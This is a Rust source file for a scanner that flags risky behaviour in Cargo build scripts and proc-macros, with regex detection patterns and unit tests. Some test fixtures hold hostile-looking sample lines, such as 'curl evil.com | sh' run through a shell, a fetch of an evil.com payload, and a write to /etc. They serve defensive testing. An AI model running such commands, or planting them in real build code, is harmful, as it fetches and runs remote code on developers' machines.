use regex::Regex;

/// Categories of risky behavior detected in build scripts and proc-macros.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Category {
    NetworkAccess,
    FileSystemWrite,
    ProcessExecution,
    EnvironmentProbing,
    DynamicLibraryLoading,
}

impl Category {
    pub fn as_str(&self) -> &'static str {
        match self {
            Category::NetworkAccess => "Network Access",
            Category::FileSystemWrite => "File System Write",
            Category::ProcessExecution => "Process Execution",
            Category::EnvironmentProbing => "Environment Probing",
            Category::DynamicLibraryLoading => "Dynamic Library Loading",
        }
    }

    /// Whether this category is inherently high-risk.
    pub fn is_high_risk(&self) -> bool {
        matches!(
            self,
            Category::NetworkAccess | Category::ProcessExecution | Category::DynamicLibraryLoading
        )
    }
}

/// A single pattern to scan for in source code.
pub struct RiskPattern {
    pub category: Category,
    pub regex: Regex,
    #[allow(dead_code)]
    pub description: &'static str,
}

/// A match found in source code.
#[derive(Debug, Clone)]
pub struct Finding {
    pub category: Category,
    pub line_number: usize,
    pub matched_text: String,
}

/// Build the list of risk patterns to scan for.
pub fn build_patterns() -> Vec<RiskPattern> {
    vec![
        // === Network Access ===
        RiskPattern {
            category: Category::NetworkAccess,
            regex: Regex::new(r"TcpStream\s*::").unwrap(),
            description: "TCP stream usage",
        },
        RiskPattern {
            category: Category::NetworkAccess,
            regex: Regex::new(r"TcpListener\s*::").unwrap(),
            description: "TCP listener usage",
        },
        RiskPattern {
            category: Category::NetworkAccess,
            regex: Regex::new(r"UdpSocket\s*::").unwrap(),
            description: "UDP socket usage",
        },
        RiskPattern {
            category: Category::NetworkAccess,
            regex: Regex::new(r"(?:ureq|reqwest|hyper|curl)\s*::").unwrap(),
            description: "HTTP client library usage",
        },
        RiskPattern {
            category: Category::NetworkAccess,
            regex: Regex::new(r#"(?:get|post|put|delete)\s*\(\s*["']https?://"#).unwrap(),
            description: "HTTP request with URL",
        },
        RiskPattern {
            category: Category::NetworkAccess,
            regex: Regex::new(r"std\s*::\s*net\s*::").unwrap(),
            description: "std::net usage",
        },
        // === File System Writes ===
        RiskPattern {
            category: Category::FileSystemWrite,
            regex: Regex::new(r"fs\s*::\s*write\b").unwrap(),
            description: "fs::write",
        },
        RiskPattern {
            category: Category::FileSystemWrite,
            regex: Regex::new(r"fs\s*::\s*remove").unwrap(),
            description: "fs::remove file/dir",
        },
        RiskPattern {
            category: Category::FileSystemWrite,
            regex: Regex::new(r"fs\s*::\s*create_dir").unwrap(),
            description: "fs::create_dir",
        },
        RiskPattern {
            category: Category::FileSystemWrite,
            regex: Regex::new(r"File\s*::\s*create\b").unwrap(),
            description: "File::create",
        },
        RiskPattern {
            category: Category::FileSystemWrite,
            regex: Regex::new(r"OpenOptions.*\.write\s*\(\s*true\s*\)").unwrap(),
            description: "OpenOptions with write",
        },
        RiskPattern {
            category: Category::FileSystemWrite,
            regex: Regex::new(r"fs\s*::\s*copy\b").unwrap(),
            description: "fs::copy",
        },
        RiskPattern {
            category: Category::FileSystemWrite,
            regex: Regex::new(r"fs\s*::\s*rename\b").unwrap(),
            description: "fs::rename",
        },
        // === Process Execution ===
        RiskPattern {
            category: Category::ProcessExecution,
            regex: Regex::new(r"Command\s*::\s*new\b").unwrap(),
            description: "Command::new",
        },
        RiskPattern {
            category: Category::ProcessExecution,
            regex: Regex::new(r"std\s*::\s*process\s*::\s*Command").unwrap(),
            description: "std::process::Command",
        },
        RiskPattern {
            category: Category::ProcessExecution,
            regex: Regex::new(r#"Command\s*::\s*new\s*\(\s*["'](?:sh|bash|cmd|powershell)"#)
                .unwrap(),
            description: "Shell invocation",
        },
        // === Environment Probing ===
        RiskPattern {
            category: Category::EnvironmentProbing,
            regex: Regex::new(r"env\s*::\s*var\b").unwrap(),
            description: "env::var",
        },
        RiskPattern {
            category: Category::EnvironmentProbing,
            regex: Regex::new(r"env\s*::\s*vars\s*\(\s*\)").unwrap(),
            description: "env::vars() - enumerating all env vars",
        },
        RiskPattern {
            category: Category::EnvironmentProbing,
            regex: Regex::new(r"env\s*::\s*set_var\b").unwrap(),
            description: "env::set_var",
        },
        // === Dynamic Library Loading ===
        RiskPattern {
            category: Category::DynamicLibraryLoading,
            regex: Regex::new(r"libloading\s*::").unwrap(),
            description: "libloading crate usage",
        },
        RiskPattern {
            category: Category::DynamicLibraryLoading,
            regex: Regex::new(r"dlopen\s*::").unwrap(),
            description: "dlopen crate usage",
        },
        RiskPattern {
            category: Category::DynamicLibraryLoading,
            regex: Regex::new(r#"(?:LoadLibrary|dlopen)\s*\("#).unwrap(),
            description: "Direct dynamic library loading",
        },
        RiskPattern {
            category: Category::DynamicLibraryLoading,
            regex: Regex::new(r#"extern\s+"C""#).unwrap(),
            description: "FFI extern block",
        },
    ]
}

/// Standard Cargo environment variables that are expected to be read in build scripts.
/// Reading these is normal and should not be flagged as suspicious.
const STANDARD_CARGO_ENV_VARS: &[&str] = &[
    "CARGO",
    "CARGO_CFG_",
    "CARGO_ENCODED_RUSTFLAGS",
    "CARGO_FEATURE_",
    "CARGO_MANIFEST_DIR",
    "CARGO_PKG_",
    "DEBUG",
    "HOST",
    "NUM_JOBS",
    "OPT_LEVEL",
    "OUT_DIR",
    "PROFILE",
    "RUSTC",
    "RUSTDOC",
    "RUSTC_LINKER",
    "TARGET",
];

/// Check if an env::var call is accessing a standard Cargo variable.
pub fn is_standard_cargo_env(line: &str) -> bool {
    for var in STANDARD_CARGO_ENV_VARS {
        if line.contains(var) {
            return true;
        }
    }
    false
}

/// Check if a line is a `use` import statement (not actual code execution).
fn is_use_import(line: &str) -> bool {
    let trimmed = line.trim();
    trimmed.starts_with("use ")
}

/// Check if a Command::new match is actually clap::Command (CLI parser, not process).
fn is_clap_command(line: &str) -> bool {
    line.contains("clap::Command::new") || line.contains("clap::builder::Command::new")
}

/// Scan source content and return all findings.
pub fn scan_content(content: &str, patterns: &[RiskPattern]) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (line_idx, line) in content.lines().enumerate() {
        // Skip comments
        let trimmed = line.trim();
        if trimmed.starts_with("//") {
            continue;
        }

        for pattern in patterns {
            if pattern.regex.is_match(line) {
                // For environment probing, skip standard Cargo env vars
                if pattern.category == Category::EnvironmentProbing && is_standard_cargo_env(line) {
                    continue;
                }

                // Skip `use` import statements - they're declarations, not execution
                if is_use_import(line) {
                    continue;
                }

                // Skip clap::Command::new - it's a CLI parser struct, not process execution
                if pattern.category == Category::ProcessExecution && is_clap_command(line) {
                    continue;
                }

                findings.push(Finding {
                    category: pattern.category,
                    line_number: line_idx + 1,
                    matched_text: trimmed.to_string(),
                });
            }
        }
    }

    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_category_as_str() {
        assert_eq!(Category::NetworkAccess.as_str(), "Network Access");
        assert_eq!(Category::FileSystemWrite.as_str(), "File System Write");
        assert_eq!(Category::ProcessExecution.as_str(), "Process Execution");
        assert_eq!(
            Category::EnvironmentProbing.as_str(),
            "Environment Probing"
        );
        assert_eq!(
            Category::DynamicLibraryLoading.as_str(),
            "Dynamic Library Loading"
        );
    }

    #[test]
    fn test_category_is_high_risk() {
        assert!(Category::NetworkAccess.is_high_risk());
        assert!(Category::ProcessExecution.is_high_risk());
        assert!(Category::DynamicLibraryLoading.is_high_risk());
        assert!(!Category::FileSystemWrite.is_high_risk());
        assert!(!Category::EnvironmentProbing.is_high_risk());
    }

    #[test]
    fn test_detect_tcp_stream() {
        let patterns = build_patterns();
        let content = r#"
use std::net::TcpStream;
let stream = TcpStream::connect("evil.com:1234");
"#;
        let findings = scan_content(content, &patterns);
        assert!(findings
            .iter()
            .any(|f| f.category == Category::NetworkAccess));
    }

    #[test]
    fn test_detect_reqwest() {
        let patterns = build_patterns();
        let content = r#"
let resp = reqwest::blocking::get("https://evil.com/payload");
"#;
        let findings = scan_content(content, &patterns);
        assert!(findings
            .iter()
            .any(|f| f.category == Category::NetworkAccess));
    }

    #[test]
    fn test_detect_http_url() {
        let patterns = build_patterns();
        let content = r#"
let resp = get("https://evil.com/payload");
"#;
        let findings = scan_content(content, &patterns);
        assert!(findings
            .iter()
            .any(|f| f.category == Category::NetworkAccess));
    }

    #[test]
    fn test_detect_fs_write() {
        let patterns = build_patterns();
        let content = r#"
std::fs::write("/etc/malicious", data);
"#;
        let findings = scan_content(content, &patterns);
        assert!(findings
            .iter()
            .any(|f| f.category == Category::FileSystemWrite));
    }

    #[test]
    fn test_detect_file_create() {
        let patterns = build_patterns();
        let content = "let f = File::create(\"output.txt\");";
        let findings = scan_content(content, &patterns);
        assert!(findings
            .iter()
            .any(|f| f.category == Category::FileSystemWrite));
    }

    #[test]
    fn test_detect_fs_remove() {
        let patterns = build_patterns();
        let content = "fs::remove_file(path);";
        let findings = scan_content(content, &patterns);
        assert!(findings
            .iter()
            .any(|f| f.category == Category::FileSystemWrite));
    }

    #[test]
    fn test_detect_command_new() {
        let patterns = build_patterns();
        let content = r#"
let output = Command::new("gcc").arg("foo.c").output();
"#;
        let findings = scan_content(content, &patterns);
        assert!(findings
            .iter()
            .any(|f| f.category == Category::ProcessExecution));
    }

    #[test]
    fn test_detect_shell_invocation() {
        let patterns = build_patterns();
        let content = r#"
Command::new("sh").arg("-c").arg("curl evil.com | sh");
"#;
        let findings = scan_content(content, &patterns);
        assert!(findings
            .iter()
            .any(|f| f.category == Category::ProcessExecution));
    }

    #[test]
    fn test_detect_env_var() {
        let patterns = build_patterns();
        let content = r#"
let home = env::var("HOME").unwrap();
"#;
        let findings = scan_content(content, &patterns);
        assert!(findings
            .iter()
            .any(|f| f.category == Category::EnvironmentProbing));
    }

    #[test]
    fn test_standard_cargo_env_not_flagged() {
        let patterns = build_patterns();
        let content = r#"
let out = env::var("OUT_DIR").unwrap();
let target = env::var("TARGET").unwrap();
let profile = env::var("PROFILE").unwrap();
"#;
        let findings = scan_content(content, &patterns);
        // None of these should be flagged because they're standard Cargo env vars
        assert!(
            !findings
                .iter()
                .any(|f| f.category == Category::EnvironmentProbing),
            "Standard Cargo env vars should not be flagged"
        );
    }

    #[test]
    fn test_non_standard_env_flagged() {
        let patterns = build_patterns();
        let content = r#"
let secret = env::var("API_KEY").unwrap();
"#;
        let findings = scan_content(content, &patterns);
        assert!(findings
            .iter()
            .any(|f| f.category == Category::EnvironmentProbing));
    }

    #[test]
    fn test_detect_libloading() {
        let patterns = build_patterns();
        let content = r#"
use libloading::Library;
let lib = libloading::Library::new("evil.so");
"#;
        let findings = scan_content(content, &patterns);
        assert!(findings
            .iter()
            .any(|f| f.category == Category::DynamicLibraryLoading));
    }

    #[test]
    fn test_detect_extern_c() {
        let patterns = build_patterns();
        let content = r#"
extern "C" {
    fn dangerous_function();
}
"#;
        let findings = scan_content(content, &patterns);
        assert!(findings
            .iter()
            .any(|f| f.category == Category::DynamicLibraryLoading));
    }

    #[test]
    fn test_comments_skipped() {
        let patterns = build_patterns();
        let content = r#"
// Command::new("gcc") this is just a comment
// TcpStream::connect("evil.com")
let x = 42;
"#;
        let findings = scan_content(content, &patterns);
        assert!(findings.is_empty(), "Comments should be skipped");
    }

    #[test]
    fn test_clean_code_no_findings() {
        let patterns = build_patterns();
        let content = r#"
fn main() {
    let x = 1 + 2;
    println!("Hello, world!");
}
"#;
        let findings = scan_content(content, &patterns);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_multiple_findings_same_line() {
        let patterns = build_patterns();
        // This line matches both std::net:: and TcpStream::
        let content = "let s = std::net::TcpStream::connect(\"evil.com\");";
        let findings = scan_content(content, &patterns);
        assert!(findings.len() >= 2, "Should find multiple matches on the same line");
    }

    #[test]
    fn test_is_standard_cargo_env() {
        assert!(is_standard_cargo_env(
            r#"env::var("CARGO_PKG_VERSION")"#
        ));
        assert!(is_standard_cargo_env(r#"env::var("OUT_DIR")"#));
        assert!(is_standard_cargo_env(
            r#"env::var("CARGO_FEATURE_DEFAULT")"#
        ));
        assert!(is_standard_cargo_env(
            r#"env::var("CARGO_CFG_TARGET_OS")"#
        ));
        assert!(is_standard_cargo_env(r#"env::var("TARGET")"#));
        assert!(is_standard_cargo_env(r#"env::var("HOST")"#));
        assert!(!is_standard_cargo_env(r#"env::var("HOME")"#));
        assert!(!is_standard_cargo_env(r#"env::var("API_KEY")"#));
    }

    #[test]
    fn test_use_import_skipped() {
        let patterns = build_patterns();
        let content = "use std::process::Command;";
        let findings = scan_content(content, &patterns);
        assert!(
            findings.is_empty(),
            "use import statements should not be flagged"
        );
    }

    #[test]
    fn test_clap_command_not_flagged() {
        let patterns = build_patterns();
        let content = r#"let app = clap::Command::new("my-app");"#;
        let findings = scan_content(content, &patterns);
        assert!(
            !findings
                .iter()
                .any(|f| f.category == Category::ProcessExecution),
            "clap::Command::new should not be flagged as process execution"
        );
    }

    #[test]
    fn test_build_patterns_all_compile() {
        // Verify all patterns compile (they're built with unwrap, but let's be explicit)
        let patterns = build_patterns();
        assert!(!patterns.is_empty());
        assert!(patterns.len() >= 15, "Should have at least 15 patterns");
    }
}
